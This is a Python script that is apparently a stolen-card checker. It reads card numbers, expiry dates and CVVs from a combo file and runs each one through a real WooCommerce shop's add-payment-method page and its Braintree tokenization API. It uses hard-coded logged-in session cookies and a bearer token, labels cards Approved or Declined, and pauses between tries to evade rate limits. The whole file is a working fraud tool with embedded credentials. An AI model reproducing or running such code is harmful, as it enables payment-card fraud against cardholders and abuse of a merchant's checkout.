import requests,re,os,pyfiglet,re,time,uuid,telebot, webbrowser
from user_agent import generate_user_agent
from colorama import Fore
from tqdm import tqdm
from rich.panel import Panel
from rich import print as PR
Z = '\033[1;31m'  # red
F = '\033[2;32m'  # green
B = '\033[2;36m'  # cyan
X = '\033[1;33m'  # yellow
C = '\033[2;35m'  # magenta

ascii_art = pyfiglet.figlet_format("           Braintree ")
print(ascii_art)

combo=input(F+'ENTER COMBO NAME :'+X)
file=open(f'{combo}',"+r")

start_num = 0
import time
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	from user_agent import generate_user_agent
	user = generate_user_agent()
	 #1
	 
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36',
	    'PHPSESSID': 'hs2vn65dgoa1hjbbj9hischdj6',
	    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
	    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'Rodamuser69%7C1725745997%7CwcTZaERMj4BKi0T2tailTy5rE9mZ0ei9x9Lp25tSOAQ%7C0cd7cf474c8855c09643fed6caa121552240c1c617cd0f591a8764e592693140',
	    'woocommerce_items_in_cart': '1',
	    'woocommerce_cart_hash': '1e4901a94f637e5a893125d691f2f2e7',
	    'wp_woocommerce_session_ee0ffb447a667c514b93ba95d290f221': '161107%7C%7C1725745999%7C%7C1725742399%7C%7C557ed5f5b050de6e703cf97fffa95481',
	    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Cache-Control': 'no-cache',
	    'Connection': 'keep-alive',
	    # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=hs2vn65dgoa1hjbbj9hischdj6; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=Rodamuser69%7C1725745997%7CwcTZaERMj4BKi0T2tailTy5rE9mZ0ei9x9Lp25tSOAQ%7C0cd7cf474c8855c09643fed6caa121552240c1c617cd0f591a8764e592693140; woocommerce_items_in_cart=1; woocommerce_cart_hash=1e4901a94f637e5a893125d691f2f2e7; wp_woocommerce_session_ee0ffb447a667c514b93ba95d290f221=161107%7C%7C1725745999%7C%7C1725742399%7C%7C557ed5f5b050de6e703cf97fffa95481; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2Fadd-payment-method%2F',
	    'Pragma': 'no-cache',
	    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.woolroots.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	import re
	import base64
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	#2

	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU2NTk4NDksImp0aSI6ImY4YWUyNTg3LWE2MmEtNGRhZS05ZDQ3LWY2MGVmMzkyMjc5NiIsInN1YiI6ImZiaHdyOTJwd25kamhndDYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZiaHdyOTJwd25kamhndDYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.QVwnZc2Kz_AnBVvrK_ijE8DmhmigkdB-FOCVGTtfFt4YrSl_VIZ4E6zuRDbAroaHq_fFFK7IR2ex34-KOW5hRQ',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '24b09fd4-d772-4420-89e1-30d601970348',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=response.json()['data']['tokenizeCreditCard']['token']

	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36',
	    'PHPSESSID': 'hs2vn65dgoa1hjbbj9hischdj6',
	    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
	    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'Rodamuser69%7C1725745997%7CwcTZaERMj4BKi0T2tailTy5rE9mZ0ei9x9Lp25tSOAQ%7C0cd7cf474c8855c09643fed6caa121552240c1c617cd0f591a8764e592693140',
	    'woocommerce_items_in_cart': '1',
	    'woocommerce_cart_hash': '1e4901a94f637e5a893125d691f2f2e7',
	    'wp_woocommerce_session_ee0ffb447a667c514b93ba95d290f221': '161107%7C%7C1725745999%7C%7C1725742399%7C%7C557ed5f5b050de6e703cf97fffa95481',
	    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Cache-Control': 'no-cache',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-05%2021%3A52%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=hs2vn65dgoa1hjbbj9hischdj6; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=Rodamuser69%7C1725745997%7CwcTZaERMj4BKi0T2tailTy5rE9mZ0ei9x9Lp25tSOAQ%7C0cd7cf474c8855c09643fed6caa121552240c1c617cd0f591a8764e592693140; woocommerce_items_in_cart=1; woocommerce_cart_hash=1e4901a94f637e5a893125d691f2f2e7; wp_woocommerce_session_ee0ffb447a667c514b93ba95d290f221=161107%7C%7C1725745999%7C%7C1725742399%7C%7C557ed5f5b050de6e703cf97fffa95481; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2Fadd-payment-method%2F',
	    'Origin': 'https://www.woolroots.com',
	    'Pragma': 'no-cache',
	    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'american-express',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc_braintree_device_data': '{"correlation_id":"84ba03584a01dc9f71dedce0e11b2b8d"}',
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post('https://www.woolroots.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	import re
	text = response.text
	pattern = r'Status code (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
		   result = 'Approved'
		elif 'Please wait for 20 seconds' in text:
		   result ='try again'
		else:
		   result='Declined(error)'
	if 'cvv' in result or 'CVV' in result or 'CVC' in result or 'cvc' in result or 'Approved' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code or street address.' in result or 'Invalid postal code and cvv'in result or 'Funds' in result or 'Invalid postal' in result or 'avs' in result or 'AVS' in result or 'added' in result or 'Duplicate' in result or 'Approved' in result:
	    print(f'{F}[{start_num}] {P} >> Approved ✅')
	else:
	    print(f'{Z}[{start_num}] {P} >> Declined ❌')
	time.sleep(20)